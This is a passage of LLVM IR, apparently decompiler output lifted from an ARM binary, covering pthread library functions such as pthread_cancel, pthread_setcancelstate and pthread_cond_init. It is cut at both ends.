  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_20780 = load i32, i32* @r4, align 4
  store i32 %v3_20780, i32* %stack_var_-16, align 4
  %v13_20780 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v0_2078c = call i32 @_thread_self.5()
  store i32 %v0_2078c, i32* %r0.global-to-local, align 4
  %v2_20790 = icmp eq i32 %arg2, 0
  store i1 %v2_20790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_2078c, i32* %r6.global-to-local, align 4
  br i1 %v2_20790, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v1_20798 = load i32, i32* %r5.global-to-local, align 4
  %v2_20798 = add i32 %v1_20798, 4
  %v3_20798 = inttoptr i32 %v2_20798 to i32*
  %v4_20798 = load i32, i32* %v3_20798, align 4
  store i32 %v4_20798, i32* %r0.global-to-local, align 4
  %v2_2079c = inttoptr i32 %v1_20798 to i32*
  %v3_2079c = load i32, i32* %v2_2079c, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_2079c, %bb ], [ undef, %entry ]
  %v2_207a4 = xor i1 %v2_20790, true
  call void @__pseudo_cond_branch(i1 %v2_207a4, i32 %.02)
  %v0_207a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_207a8 = add i32 %v0_207a8, 66
  %v2_207a8 = inttoptr i32 %v1_207a8 to i8*
  %v3_207a8 = load i8, i8* %v2_207a8, align 1
  %v0_207ac = load i32, i32* %r5.global-to-local, align 4
  %v1_207ac = add i32 %v0_207ac, 8
  store i32 %v1_207ac, i32* %r1.global-to-local, align 4
  %v1_207b0 = inttoptr i32 %v1_207ac to i32*
  %v2_207b0 = load i32, i32* %v1_207b0, align 4
  store i32 %v2_207b0, i32* %r1.global-to-local, align 4
  %v3_207b0 = add i32 %v0_207ac, 12
  %v4_207b0 = inttoptr i32 %v3_207b0 to i32*
  %v5_207b0 = load i32, i32* %v4_207b0, align 4
  %v2_207b4 = icmp eq i8 %v3_207a8, 0
  store i1 %v2_207b4, i1* %cpsr_z.global-to-local, align 1
  %v2_207b8 = add i32 %v0_207a8, 60
  %v3_207b8 = inttoptr i32 %v2_207b8 to i32*
  store i32 %v5_207b0, i32* %v3_207b8, align 4
  %v0_207bc = load i32, i32* %r1.global-to-local, align 4
  %v1_207bc = trunc i32 %v0_207bc to i8
  %v2_207bc = load i32, i32* %r6.global-to-local, align 4
  %v3_207bc = add i32 %v2_207bc, 65
  %v4_207bc = inttoptr i32 %v3_207bc to i8*
  store i8 %v1_207bc, i8* %v4_207bc, align 1
  %v0_207c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_207c0, label %dec_label_pc_207d8, label %dec_label_pc_207c4

dec_label_pc_207c4:                               ; preds = %.thread1
  %v0_207c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_207c4 = add i32 %v0_207c4, 64
  %v2_207c4 = inttoptr i32 %v1_207c4 to i16*
  %v3_207c4 = load i16, i16* %v2_207c4, align 2
  %v7_207c8 = icmp eq i16 %v3_207c4, 256
  store i1 %v7_207c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_207c8, label %bb9, label %.thread3

bb9:                                              ; preds = %dec_label_pc_207c4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v13_20780, i32* %r1.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_207c4, %bb9
  call void @__pseudo_cond_branch(i1 %v7_207c8, i32 ptrtoint (i32* @global_var_21250.1419 to i32))
  br label %dec_label_pc_207d8

dec_label_pc_207d8:                               ; preds = %.thread1, %.thread3
  %v1_207dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_207dc

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder label %dec_label_pc_207d8, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_207e8 = call i32 @_thread_self.5()
  store i32 %v0_207e8, i32* %r0.global-to-local, align 4
  %v1_207ec = add i32 %v0_207e8, 66
  %v2_207ec = inttoptr i32 %v1_207ec to i8*
  %v3_207ec = load i8, i8* %v2_207ec, align 1
  %v2_207f0 = icmp eq i8 %v3_207ec, 0
  br i1 %v2_207f0, label %dec_label_pc_2080c, label %dec_label_pc_207f8

dec_label_pc_207f8:                               ; preds = %entry
  %v1_207f8 = add i32 %v0_207e8, 64
  %v2_207f8 = inttoptr i32 %v1_207f8 to i8*
  %v3_207f8 = load i8, i8* %v2_207f8, align 1
  %v2_207fc = icmp eq i8 %v3_207f8, 0
  br i1 %v2_207fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_207f8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_207f8, %bb
  call void @__pseudo_cond_branch(i1 %v2_207fc, i32 ptrtoint (i32* @global_var_21250.1419 to i32))
  %v1_20814.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2080c

dec_label_pc_2080c:                               ; preds = %entry, %.thread
  %v1_20814 = phi i32 [ %v0_207e8, %entry ], [ %v1_20814.pre, %.thread ]
  ret i32 %v1_20814

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2080c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v2_2081c = icmp ne i8 %arg1, 0
  %v7_2081c = icmp eq i8 %arg1, 1
  store i1 %v7_2081c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_2082c = xor i1 %v7_2081c, true
  %v3_2082c = and i1 %v2_2081c, %v2_2082c
  br i1 %v3_2082c, label %dec_label_pc_2086c, label %dec_label_pc_20834

dec_label_pc_20834:                               ; preds = %entry
  %v0_20834 = call i32 @_thread_self.5()
  %v0_20838 = load i32, i32* %r4.global-to-local, align 4
  %v2_20838 = icmp eq i32 %v0_20838, 0
  store i1 %v2_20838, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_20834, 65
  %.pre5 = inttoptr i32 %.pre to i8*
  br i1 %v2_20838, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_20834
  %v4_2083c = load i8, i8* %.pre5, align 1
  %v5_2083c = zext i8 %v4_2083c to i32
  %v3_20840 = inttoptr i32 %v0_20838 to i32*
  store i32 %v5_2083c, i32* %v3_20840, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20834, %bb
  %v1_20844 = add i32 %v0_20834, 66
  %v2_20844 = inttoptr i32 %v1_20844 to i8*
  %v3_20844 = load i8, i8* %v2_20844, align 1
  %v4_20844 = zext i8 %v3_20844 to i32
  store i32 %v4_20844, i32* @r3, align 4
  %v2_20848 = icmp eq i8 %v3_20844, 0
  store i1 %v2_20848, i1* %cpsr_z.global-to-local, align 1
  %v0_2084c = load i32, i32* %r5.global-to-local, align 4
  %v1_2084c = trunc i32 %v0_2084c to i8
  store i8 %v1_2084c, i8* %.pre5, align 1
  %v0_20850 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_20850, label %dec_label_pc_2086c, label %dec_label_pc_20854

dec_label_pc_20854:                               ; preds = %.thread
  %v1_20854 = add i32 %v0_20834, 64
  %v2_20854 = inttoptr i32 %v1_20854 to i16*
  %v3_20854 = load i16, i16* %v2_20854, align 2
  %v4_20854 = zext i16 %v3_20854 to i32
  store i32 %v4_20854, i32* @r3, align 4
  %v7_20858 = icmp eq i16 %v3_20854, 256
  store i1 %v7_20858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_20858, label %bb13, label %.thread1

bb13:                                             ; preds = %dec_label_pc_20854
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_20854, %bb13
  call void @__pseudo_cond_branch(i1 %v7_20858, i32 ptrtoint (i32* @global_var_21250.1419 to i32))
  br label %dec_label_pc_2086c

dec_label_pc_2086c:                               ; preds = %.thread1, %.thread, %entry
  %storemerge = phi i32 [ 22, %entry ], [ 0, %.thread ], [ 0, %.thread1 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_20834, { 1, 2, 0 }
  uselistorder i1 %v7_2081c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v2_2087c = icmp ne i8 %arg1, 0
  %v7_2087c = icmp eq i8 %arg1, 1
  store i1 %v7_2087c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_2088c = xor i1 %v7_2087c, true
  %v3_2088c = and i1 %v2_2087c, %v2_2088c
  br i1 %v3_2088c, label %dec_label_pc_208cc, label %dec_label_pc_20894

dec_label_pc_20894:                               ; preds = %entry
  %v0_20894 = call i32 @_thread_self.5()
  %v0_20898 = load i32, i32* %r4.global-to-local, align 4
  %v2_20898 = icmp eq i32 %v0_20898, 0
  store i1 %v2_20898, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_20894, 64
  %.pre5 = inttoptr i32 %.pre to i8*
  br i1 %v2_20898, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_20894
  %v4_2089c = load i8, i8* %.pre5, align 1
  %v5_2089c = zext i8 %v4_2089c to i32
  %v3_208a0 = inttoptr i32 %v0_20898 to i32*
  store i32 %v5_2089c, i32* %v3_208a0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20894, %bb
  %v1_208a4 = add i32 %v0_20894, 66
  %v2_208a4 = inttoptr i32 %v1_208a4 to i8*
  %v3_208a4 = load i8, i8* %v2_208a4, align 1
  %v2_208a8 = icmp eq i8 %v3_208a4, 0
  store i1 %v2_208a8, i1* %cpsr_z.global-to-local, align 1
  %v0_208ac = load i32, i32* %r5.global-to-local, align 4
  %v1_208ac = trunc i32 %v0_208ac to i8
  store i8 %v1_208ac, i8* %.pre5, align 1
  %v0_208b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_208b0, label %dec_label_pc_208cc, label %dec_label_pc_208b4

dec_label_pc_208b4:                               ; preds = %.thread
  %v2_208b4 = inttoptr i32 %.pre to i16*
  %v3_208b4 = load i16, i16* %v2_208b4, align 2
  %v7_208b8 = icmp eq i16 %v3_208b4, 256
  store i1 %v7_208b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_208b8, label %bb13, label %.thread1

bb13:                                             ; preds = %dec_label_pc_208b4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_208b4, %bb13
  call void @__pseudo_cond_branch(i1 %v7_208b8, i32 ptrtoint (i32* @global_var_21250.1419 to i32))
  br label %dec_label_pc_208cc

dec_label_pc_208cc:                               ; preds = %.thread1, %.thread, %entry
  %storemerge = phi i32 [ 22, %entry ], [ 0, %.thread ], [ 0, %.thread1 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_20894, { 1, 0 }
  uselistorder i1 %v7_2087c, { 1, 0 }
  uselistorder i32 ()* @_thread_self.5, { 5, 0, 2, 4, 7, 6, 3, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_208d8 = load i32, i32* @r4, align 4
  store i32 %v3_208d8, i32* %stack_var_-24, align 4
  %v9_208d8 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r7, align 4
  %v4_208e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_208f0 = urem i32 %arg1, 1024
  %v4_208f4 = mul nuw nsw i32 %v3_208f0, 16
  %v5_208f4 = add i32 %v4_208e8, %v4_208f4
  store i32 %v5_208f4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %v5_208f4, i32* @r0, align 4
  %v0_20904 = call i32 @__pthread_lock()
  store i32 %v0_20904, i32* %r0.global-to-local, align 4
  %v0_20908 = load i32, i32* @r5, align 4
  %v1_20908 = add i32 %v0_20908, 8
  %v2_20908 = inttoptr i32 %v1_20908 to i32*
  %v3_20908 = load i32, i32* %v2_20908, align 4
  store i32 %v3_20908, i32* %r4.global-to-local, align 4
  %v2_2090c = icmp eq i32 %v3_20908, 0
  store i1 %v2_2090c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2090c, label %dec_label_pc_20920, label %dec_label_pc_20914

dec_label_pc_20914:                               ; preds = %entry
  %v1_20914 = add i32 %v3_20908, 16
  %v2_20914 = inttoptr i32 %v1_20914 to i32*
  %v3_20914 = load i32, i32* %v2_20914, align 4
  %v1_20918 = load i32, i32* @r6, align 4
  %v9_20918 = icmp eq i32 %v3_20914, %v1_20918
  store i1 %v9_20918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_20918, label %dec_label_pc_209a8, label %dec_label_pc_20920

dec_label_pc_20920:                               ; preds = %dec_label_pc_20914, %entry
  store i32 %v0_20908, i32* %r0.global-to-local, align 4
  %v1_20924 = call i32 @__pthread_unlock(i32 %v0_20908)
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_209d4

dec_label_pc_2093c:                               ; preds = %bb12
  %v0_2093c = load i32, i32* %r4.global-to-local, align 4
  %v1_2093c = add i32 %v0_2093c, 324
  %v2_2093c = inttoptr i32 %v1_2093c to i32*
  %v3_2093c = load i32, i32* %v2_2093c, align 4
  %v2_20940 = icmp eq i32 %v3_2093c, 0
  store i1 %v2_20940, i1* %cpsr_z.global-to-local, align 1
  %v1_20944 = add i32 %v0_2093c, 20
  %v2_20944 = inttoptr i32 %v1_20944 to i32*
  %v3_20944 = load i32, i32* %v2_20944, align 4
  store i32 %v3_20944, i32* %r8.global-to-local, align 4
  br i1 %v2_20940, label %dec_label_pc_2096c, label %dec_label_pc_20950

dec_label_pc_20950:                               ; preds = %dec_label_pc_2093c
  %v1_20950 = inttoptr i32 %v3_2093c to i32*
  %v2_20950 = load i32, i32* %v1_20950, align 4
  store i32 %v2_20950, i32* %r0.global-to-local, align 4
  %v1_20958 = add i32 %v3_2093c, 4
  %v2_20958 = inttoptr i32 %v1_20958 to i32*
  %v3_20958 = load i32, i32* %v2_20958, align 4
  call void @__pseudo_branch(i32 %v3_20958)
  %v1_20964 = trunc i32 %v2_20950 to i8
  %v2_20964 = load i32, i32* %r4.global-to-local, align 4
  %v3_20964 = add i32 %v2_20964, 320
  %v4_20964 = inttoptr i32 %v3_20964 to i8*
  store i8 %v1_20964, i8* %v4_20964, align 1
  %v0_20968 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2096c

dec_label_pc_2096c:                               ; preds = %dec_label_pc_2093c, %dec_label_pc_20950
  %storemerge = phi i32 [ %v0_20968, %dec_label_pc_20950 ], [ 0, %dec_label_pc_2093c ]
  store i32 %storemerge, i32* %r6.global-to-local, align 4
  %v0_2096c = load i32, i32* @r5, align 4
  store i32 %v0_2096c, i32* %r0.global-to-local, align 4
  %v1_20970 = call i32 @__pthread_unlock(i32 %v0_2096c)
  store i32 %v1_20970, i32* %r0.global-to-local, align 4
  %v2_20974 = icmp eq i32 %storemerge, 0
  store i1 %v2_20974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_20974, label %dec_label_pc_2098c, label %dec_label_pc_2097c

dec_label_pc_2097c:                               ; preds = %dec_label_pc_2096c
  %v0_2097c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2097c, i32* @r0, align 4
  %v0_20980 = call i32 @__pthread_restart_new()
  br label %dec_label_pc_20984

dec_label_pc_20984:                               ; preds = %dec_label_pc_209d0, %dec_label_pc_2097c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_209d4

dec_label_pc_2098c:                               ; preds = %dec_label_pc_2096c
  %v0_20990 = load i32, i32* @r7, align 4
  %v2_20990 = add i32 %v0_20990, 252
  %v3_20990 = inttoptr i32 %v2_20990 to i32*
  %v4_20990 = load i32, i32* %v3_20990, align 4
  %v0_20994 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_20994, i32* %r0.global-to-local, align 4
  %v1_20998 = inttoptr i32 %v4_20990 to i32*
  %v2_20998 = load i32, i32* %v1_20998, align 4
  %v2_2099c = call i32 @kill(i32 %v0_20994, i32 %v2_20998)
  %v0_209a0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_209a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_209d4

dec_label_pc_209a8:                               ; preds = %dec_label_pc_20914
  %v1_209a8 = add i32 %v3_20908, 66
  %v2_209a8 = inttoptr i32 %v1_209a8 to i8*
  %v3_209a8 = load i8, i8* %v2_209a8, align 1
  %v4_209a8 = zext i8 %v3_209a8 to i32
  %v1_209ac = add i32 %v3_20908, 64
  %v2_209ac = inttoptr i32 %v1_209ac to i8*
  %v3_209ac = load i8, i8* %v2_209ac, align 1
  %v2_209b0 = icmp eq i8 %v3_209a8, 0
  store i1 %v2_209b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_209b0, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_209a8
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_209a8, %bb
  %v1_209bc = phi i32 [ %v4_209a8, %dec_label_pc_209a8 ], [ 1, %bb ]
  %v7_209b8 = icmp eq i8 %v3_209ac, 1
  store i1 %v7_209b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_209b8, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v0_209c0 = phi i32 [ %v1_209bc, %bb10 ], [ 1, %bb11 ]
  %v2_209c0 = icmp eq i32 %v0_209c0, 0
  store i1 %v2_209c0, i1* %cpsr_z.global-to-local, align 1
  store i8 1, i8* %v2_209a8, align 1
  %v0_209cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_209cc, label %dec_label_pc_2093c, label %dec_label_pc_209d0

dec_label_pc_209d0:                               ; preds = %bb12
  %v0_20930 = load i32, i32* @r5, align 4
  store i32 %v0_20930, i32* %r0.global-to-local, align 4
  %v1_20934 = call i32 @__pthread_unlock(i32 %v0_20930)
  br label %dec_label_pc_20984

dec_label_pc_209d4:                               ; preds = %dec_label_pc_2098c, %dec_label_pc_20984, %dec_label_pc_20920
  %v1_209d8 = phi i32 [ %v0_209a0, %dec_label_pc_2098c ], [ 0, %dec_label_pc_20984 ], [ 3, %dec_label_pc_20920 ]
  %v2_209d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_209d4, i32* %r4.global-to-local, align 4
  store i32 %v9_208d8, i32* %r6.global-to-local, align 4
  ret i32 %v1_209d8

; uselistorder directives
  uselistorder i1 %v7_209b8, { 1, 0 }
  uselistorder i32 %v3_2093c, { 1, 0, 2 }
  uselistorder i32 %v3_20908, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_20908, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 8, 5, 6, 7, 9, 10, 11, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32 (i32, i32)* @kill, { 8, 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_2096c, { 1, 0 }
}

define i32 @function_209e0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_209e0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_209e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_209e0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_209e0
  %v2_209e0 = load i32, i32* @r4, align 4
  %v8_209e0 = ashr i32 %v2_209e0, %tmp
  %v9_209e0 = and i32 %v8_209e0, %tmp
  store i32 %v9_209e0, i32* %r0.global-to-local, align 4
  %v4_209e4 = inttoptr i32 %v9_209e0 to i32*
  store i32 %v9_209e0, i32* %v4_209e4, align 4
  %v5_209e4 = load i32, i32* @ip, align 4
  %v6_209e4 = load i32, i32* %r0.global-to-local, align 4
  %v7_209e4 = sub i32 %v6_209e4, %v5_209e4
  store i32 %v7_209e4, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_209e0, %bb
  %v8_209e4 = phi i32 [ %tmp, %dec_label_pc_209e0 ], [ %v7_209e4, %bb ]
  ret i32 %v8_209e4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @_remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_20a402 = load i32, i32* @r0, align 4
  %v1_20a403 = inttoptr i32 %v0_20a402 to i32*
  %v2_20a404 = load i32, i32* %v1_20a403, align 4
  store i32 %v2_20a404, i32* %r2.global-to-local, align 4
  %v2_20a446 = icmp eq i32 %v2_20a404, 0
  br i1 %v2_20a446, label %dec_label_pc_20a4c, label %dec_label_pc_20a1c

dec_label_pc_20a1c:                               ; preds = %entry, %dec_label_pc_20a3c
  %v1_20a2c = phi i32 [ %v1_20a24, %dec_label_pc_20a3c ], [ %v0_20a402, %entry ]
  %v0_20a24 = phi i32 [ %v2_20a40, %dec_label_pc_20a3c ], [ %v2_20a404, %entry ]
  %v9_20a1c = icmp eq i32 %v0_20a24, %arg1
  %v1_20a24 = add i32 %v0_20a24, 8
  br i1 %v9_20a1c, label %dec_label_pc_20a24, label %dec_label_pc_20a3c

dec_label_pc_20a24:                               ; preds = %dec_label_pc_20a1c
  %v2_20a24 = inttoptr i32 %v1_20a24 to i32*
  %v3_20a24 = load i32, i32* %v2_20a24, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_20a2c = inttoptr i32 %v1_20a2c to i32*
  store i32 %v3_20a24, i32* %v2_20a2c, align 4
  %v1_20a34 = load i32, i32* %r2.global-to-local, align 4
  %v2_20a34 = add i32 %v1_20a34, 8
  %v3_20a34 = inttoptr i32 %v2_20a34 to i32*
  store i32 0, i32* %v3_20a34, align 4
  %v0_20a50.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a50

dec_label_pc_20a3c:                               ; preds = %dec_label_pc_20a1c
  %v1_20a40 = inttoptr i32 %v1_20a24 to i32*
  %v2_20a40 = load i32, i32* %v1_20a40, align 4
  store i32 %v2_20a40, i32* %r2.global-to-local, align 4
  %v2_20a44 = icmp eq i32 %v2_20a40, 0
  br i1 %v2_20a44, label %dec_label_pc_20a40.dec_label_pc_20a4c_crit_edge, label %dec_label_pc_20a1c

dec_label_pc_20a40.dec_label_pc_20a4c_crit_edge:  ; preds = %dec_label_pc_20a3c
  br label %dec_label_pc_20a4c

dec_label_pc_20a4c:                               ; preds = %dec_label_pc_20a40.dec_label_pc_20a4c_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20a50

dec_label_pc_20a50:                               ; preds = %dec_label_pc_20a24, %dec_label_pc_20a4c
  %v0_20a50 = phi i32 [ %v0_20a50.pre, %dec_label_pc_20a24 ], [ 0, %dec_label_pc_20a4c ]
  ret i32 %v0_20a50

; uselistorder directives
  uselistorder i32 %v2_20a40, { 1, 2, 0 }
  uselistorder i32 %v1_20a24, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_20a50, { 1, 0 }
  uselistorder label %dec_label_pc_20a1c, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_20a60 = add i32 %tmp, 8
  %v3_20a60 = inttoptr i32 %v2_20a60 to i32*
  store i32 0, i32* %v3_20a60, align 4
  %v1_20a64 = load i32, i32* %r3.global-to-local, align 4
  %v2_20a64 = inttoptr i32 %v1_20a64 to i32*
  store i32 0, i32* %v2_20a64, align 4
  %v1_20a68 = load i32, i32* %r3.global-to-local, align 4
  %v2_20a68 = add i32 %v1_20a68, 4
  %v3_20a68 = inttoptr i32 %v2_20a68 to i32*
  store i32 0, i32* %v3_20a68, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_20a70 = add i32 %arg1, 8
  %v2_20a70 = inttoptr i32 %v1_20a70 to i32*
  %v3_20a70 = load i32, i32* %v2_20a70, align 4
  %v2_20a74 = icmp eq i32 %v3_20a70, 0
  %. = select i1 %v2_20a74, i32 0, i32 16
  ret i32 %.
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %arg1.cmp = icmp ugt i32 %arg1, 1
  br i1 %arg1.cmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_20aa8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %arg1.cmp, i32 %v0_20aa8)
  %v2_20aac = icmp eq i32 %arg1, 0
  %. = select i1 %v2_20aac, i32 0, i32 38
  ret i32 %.

; uselistorder directives
  uselistorder i1 %arg1.cmp, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @___pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_20abc = load i32, i32* @r4, align 4
  %v6_20abc = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_20ac0 = icmp eq i32 %arg2, 0
  %v0_20ac8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_20ac8, i32* @r4, align 4
  br i1 %v2_20ac0, label %dec_label_pc_20ae0, label %dec_label_pc_20ad0

dec_label_pc_20ad0:                               ; preds = %entry
  %v1_20ad0 = add i32 %v0_20ac8, 64
  %v2_20ad0 = inttoptr i32 %v1_20ad0 to i8*
  %v3_20ad0 = load i8, i8* %v2_20ad0, align 1
  %v2_20ad4 = icmp eq i8 %v3_20ad0, 0
  br i1 %v2_20ad4, label %dec_label_pc_20aec, label %dec_label_pc_20afc

dec_label_pc_20ae0:                               ; preds = %entry
  %v1_20ae0 = add i32 %v0_20ac8, 28
  %v2_20ae0 = inttoptr i32 %v1_20ae0 to i32*
  %v3_20ae0 = load i32, i32* %v2_20ae0, align 4
  store i32 %v3_20ae0, i32* @r0, align 4
  %v0_20ae8 = call i32 @__pthread_lock()
  store i32 %v0_20ae8, i32* %r0.global-to-local, align 4
  %v0_20aec.pre = load i32, i32* @r5, align 4
  %v1_20af0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_20aec

dec_label_pc_20aec:                               ; preds = %dec_label_pc_20ad0, %dec_label_pc_20ae0
  %v1_20af0 = phi i32 [ %v0_20ac8, %dec_label_pc_20ad0 ], [ %v1_20af0.pre, %dec_label_pc_20ae0 ]
  %v0_20af0 = phi i32 [ %arg2, %dec_label_pc_20ad0 ], [ %v0_20aec.pre, %dec_label_pc_20ae0 ]
  %v2_20aec = icmp eq i32 %v0_20af0, 0
  %v2_20af0 = add i32 %v1_20af0, 324
